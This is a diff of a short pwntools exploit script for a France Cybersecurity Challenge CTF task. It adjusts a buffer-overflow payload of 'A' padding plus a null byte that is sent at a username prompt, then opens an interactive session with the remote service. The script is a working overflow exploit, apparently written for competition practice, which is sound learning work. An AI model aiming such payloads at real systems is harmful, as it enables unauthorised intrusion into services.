@@ -3,13 +3,10 @@ from pwn import *
 
 s = remote('challenges.france-cybersecurity-challenge.fr',port=2100)
 
-#p = s.process('./uid')
-
 #recupere l'adresse leak du buffer 
 s.recvuntil('username: ', drop=True)
 
-payload = 'A'*56 + '\x00'*100
-s.sendline(payload) 
+payload = 'A'*44 + '\x00'
+s.sendline(payload)
 s.interactive()
-s.close()
 s.close()
